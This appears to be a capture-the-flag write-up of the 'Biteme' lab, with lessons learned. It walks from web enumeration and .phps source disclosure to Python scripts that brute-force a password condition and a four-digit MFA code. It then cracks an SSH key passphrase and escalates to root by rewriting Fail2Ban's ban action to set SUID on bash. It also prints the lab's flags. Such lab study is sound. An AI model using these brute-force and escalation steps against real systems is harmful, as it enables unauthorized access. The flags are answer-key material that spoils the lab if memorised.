# 🦇 Biteme 

### Difficulty: Medium

## 🧭 Introduction

This room is a classic web-to-root chain. The attack starts with **web enumeration**, moves into **source-code disclosure**, then uses leaked application information to recover credentials and bypass **MFA**. From there, a file-viewer feature exposes an SSH private key, which provides a foothold as `jason`.

The final privilege-escalation chain abuses **sudo permissions over `fred`**, a writable **Fail2Ban configuration**, and the fact that Fail2Ban executes its ban action with elevated privileges. By modifying that action and deliberately triggering a ban, `/bin/bash` is given the SUID bit. Running `bash -p` then provides a root shell.

The overall attack path is:

```text
Web enumeration
      ↓
Source-code disclosure (.phps)
      ↓
Credential discovery
      ↓
MFA brute-force
      ↓
File Viewer
      ↓
SSH private key
      ↓
SSH as jason
      ↓
Sudo → fred
      ↓
Writable Fail2Ban configuration
      ↓
SUID /bin/bash
      ↓
Root
```

---

# 🔍 1. Reconnaissance

I started with a standard Nmap scan against the target.

```bash
nmap -sC -sV <TARGET_IP>
```

The web server was the main attack surface, so I moved on to directory enumeration.

```bash
dirsearch -u http://<TARGET_IP>
```

The enumeration revealed an interesting `/console` directory.

Navigating to:

```text
http://<TARGET_IP>/console
```

presented a login page.

➡️ At this point, the goal was to understand how the application handled authentication and whether any useful information was being exposed.

---

# 🌐 2. Enumerating the Web Application

I intercepted requests with **Burp Suite** and inspected the responses.

Interestingly, the application exposed two usernames:

```text
fred
jason
```

There was also some obfuscated JavaScript worth investigating.

💭 **Important lesson:** Don't just look at what the browser renders. Burp's HTTP history, responses, JavaScript files, comments, and source code can reveal information that isn't visible in the normal interface.

While examining Burp's Sitemap, I discovered another useful directory.

Further enumeration exposed a `ReadMe` file.

The README revealed information about the application and its underlying project/version.

I also discovered a `words` directory containing a text file that looked like a collection of potential passwords.

That suggested the application might contain some form of intentionally weak authentication mechanism.

---

# 📄 3. Discovering `.phps` Source-Code Files

While investigating the application, I noticed references to PHP syntax highlighting.

A quick search led to PHP's `highlight_file()` functionality, which commonly uses the `.phps` extension to display PHP source code.

That gave me a new enumeration idea:

```text
index.php
     ↓
index.phps
```

I started checking for `.phps` versions of interesting PHP files.

Enumeration of `/console` revealed files such as:

```text
config.phps
index.phps
```

Opening `config.phps` exposed application configuration information that wasn't available through the normal PHP page.

📊 One of the values contained encoded information.

After decoding it with CyberChef, I recovered a useful user identifier.

I then inspected `index.phps`.

The source contained a reference to:

```text
functions.php
```

Although the directly accessible `functions.php` did not reveal anything useful, checking the `.phps` version exposed additional application logic.

💡 **Key takeaway:** When PHP applications are present, always consider whether alternate extensions or backup/source files expose the underlying code.

---

# 🔐 4. Recovering the First Credentials

The exposed source code revealed a password-generation condition.

The important part was that the resulting MD5 hash needed to end in:

```text
001
```

Rather than manually testing values, I wrote a small Python script to search for a value satisfying the condition.

```python
#!/usr/bin/python3

import hashlib

target = '001'
candidate = 0

while True:
    plaintext = str(candidate)
    digest = hashlib.md5(plaintext.encode('ascii')).hexdigest()

    if digest[-3:] == target:
        print('plaintext:', plaintext)
        print('md5:', digest)
        break

    candidate += 1
```

The resulting credentials were:

```text
Username: jason_test_account
Password: 5265
```

➡️ This allowed access to the next stage of the application.

---

# 🔢 5. Bypassing the MFA

After authenticating, the application presented another page requiring a **four-digit MFA code**.

Because the code was only four digits, the search space was small enough for the lab.

I generated the possible values using:

```bash
crunch 4 4 1234567890 -o number-list.txt
```

I then wrote a Python script to submit each candidate to the MFA endpoint and identify a response that differed from the normal:

```text
Incorrect code
```

Example:

```python
#!/usr/bin/python3

import requests

url = "http://<TARGET_IP>/console/mfa.php"

number_list = open("number-list.txt", "r").readlines()

cookie = {
    "PHPSESSID": "<SESSION>",
    "user": "jason_test_account",
    "pwd": "5265"
}

for i in number_list:
    MFA = i.strip()

    data = {
        "code": MFA
    }

    r = requests.post(
        url,
        data=data,
        cookies=cookie
    )

    if "Incorrect code" not in r.text:
        print(f"Found the code!: {MFA}")
```

💭 The important concept isn't the script itself. It's **response-based enumeration**: instead of assuming success from a status code, compare the application's responses and identify the condition that indicates successful authentication.

Once the correct MFA code was found, I reached the application's **File Viewer**.

---

# 📂 6. Abusing the File Viewer

The File Viewer provided access to arbitrary files on the system.

I first checked:

```text
/etc/passwd
```

which confirmed the local users.

More importantly, the viewer allowed access to:

```text
/home/jason/.ssh/id_rsa
```

That was a major finding.

➡️ An SSH private key belonging to `jason` had been exposed through the application's file-reading functionality.

I saved the key locally and fixed its permissions:

```bash
chmod 600 id_rsa
```

I then attempted SSH authentication:

```bash
ssh -i id_rsa jason@<TARGET_IP>
```

The key was protected by a passphrase, so I needed to recover it.

---

# 🔓 7. Cracking Jason's SSH Key Passphrase

SSH private keys can be converted into a format that John the Ripper understands.

I used:

```bash
ssh2john id_rsa > id_rsa.hash
```

Then attacked the resulting hash using the RockYou wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

The passphrase was recovered:

```text
1a2b3c4d
```

I could now authenticate as `jason`:

```bash
ssh -i id_rsa jason@<TARGET_IP>
```

---

# 🏁 8. User Flag

After getting the SSH foothold, I checked Jason's home directory.

The user flag was present there.

```text
THM{6fbf1fb7241dac060cd3abba70c33070}
```

🏁 **User Flag:**

```text
THM{6fbf1fb7241dac060cd3abba70c33070}
```

Now the objective was privilege escalation.

---

# ⬆️ 9. Enumerating Sudo Permissions

The first privilege-escalation check was:

```bash
sudo -l
```

The output showed that Jason could execute commands as the user `fred` without entering a password.

That immediately made `fred` an interesting escalation target.

I checked what `fred` could execute with elevated privileges.

The allowed commands led toward the system's **Fail2Ban configuration**.

---

# 🛡️ 10. Investigating Fail2Ban

Fail2Ban monitors logs for repeated authentication failures and can automatically execute an action when an IP address is banned.

The interesting configuration was under:

```text
/etc/fail2ban/
```

The important setting was the **`actionban`** command.

Conceptually:

```text
Failed login attempts
        ↓
Fail2Ban detects them
        ↓
IP gets banned
        ↓
actionban executes
```

If an attacker can modify the command executed by `actionban`, they can potentially turn a normal security mechanism into a privilege-escalation mechanism.

The room's configuration allowed a user-controlled modification of the relevant Fail2Ban configuration.

💡 This is a great example of why **service configuration permissions matter just as much as binary permissions**. A perfectly configured executable can still become dangerous when an unprivileged user can modify the configuration controlling how it runs.

---

# 📝 11. Modifying the Fail2Ban Action

I first backed up the original configuration.

The relevant `actionban` command was then modified so that, when Fail2Ban performed a ban action, it would set the SUID permission on `/bin/bash`.

The important concept is:

```text
Fail2Ban
   ↓
runs actionban with elevated privileges
   ↓
/bin/bash receives SUID
```

After making the configuration change, I restarted the relevant service so the modified configuration would be loaded.

---

# 🚨 12. Triggering the Fail2Ban Ban

Rather than relying on Hydra, I checked:

```text
/etc/fail2ban/jail.local
```

to determine how many failed authentication attempts were required to trigger a ban.

I then deliberately generated enough failed SSH authentication attempts against `fred`.

Once Fail2Ban detected the failures, it executed the modified `actionban`.

I checked the permissions on `/bin/bash`:

```bash
ls -l /bin/bash
```

The SUID bit was now present.

📊 Conceptually:

```text
-rwsr-xr-x ... /bin/bash
    ^
    SUID
```

➡️ This meant Bash would execute with the privileges of its owner rather than simply the privileges of the invoking user.

Since `/bin/bash` is owned by root, this provided the final escalation path.

---

# 👑 13. Root Shell

The final step was:

```bash
bash -p
```

The `-p` option tells Bash to preserve its effective privileges rather than dropping them.

I confirmed the resulting privileges:

```bash
whoami
```

```text
root
```

I then navigated to the root user's home directory:

```bash
cd /root
ls
```

The root flag was there.

---

# 🏆 14. Root Flag

```text
THM{0e355b5c907ef7741f40f4a41cc6678d}
```

🏁 **Root Flag:**

```text
THM{0e355b5c907ef7741f40f4a41cc6678d}
```

---

# 🧠 Attack Chain Summary

The complete Biteme attack chain was:

```text
                WEB ENUMERATION
                       │
                       ▼
              /console discovered
                       │
                       ▼
            Burp/source enumeration
                       │
                       ▼
                .phps disclosure
                       │
                       ▼
             Application information
                       │
                       ▼
             Recover jason credentials
                       │
                       ▼
                  MFA bypass
                       │
                       ▼
                File Viewer
                       │
                       ▼
             /home/jason/.ssh/id_rsa
                       │
                       ▼
               ssh2john + John
                       │
                       ▼
                  SSH as jason
                       │
                       ▼
                 sudo -l
                       │
                       ▼
                sudo → fred
                       │
                       ▼
             Fail2Ban configuration
                       │
                       ▼
             Modify actionban
                       │
                       ▼
          Trigger Fail2Ban ban action
                       │
                       ▼
              SUID /bin/bash
                       │
                       ▼
                   bash -p
                       │
                       ▼
                     ROOT
```

## 🎯 Key Lessons

- **Enumerate source files**, not just normal web pages. `.phps` and backup files can expose application logic and credentials.
    
- **Inspect authentication workflows carefully.** MFA is only as strong as its implementation; a four-digit code with no effective rate limiting is vulnerable to exhaustive guessing.
    
- **File-read vulnerabilities are extremely powerful.** Reading `/home/jason/.ssh/id_rsa` turned a web vulnerability into SSH access.
    
- **Always run `sudo -l` after getting a Linux foothold.**
    
- **Service configurations deserve privilege-escalation checks.** A user may not need permission to modify a root binary if they can modify what a privileged service executes.
    
- **Fail2Ban is a particularly interesting escalation target when its configuration is writable**, because its automated actions execute as a privileged service.
    
- **SUID permissions on interpreters are dangerous.** A SUID-root Bash provides a direct path to root in a lab environment.
    

### 🏁 Flags

|Objective|Flag|
|---|---|
|👤 User|`THM{6fbf1fb7241dac060cd3abba70c33070}`|
|👑 Root|`THM{0e355b5c907ef7741f40f4a41cc6678d}`|
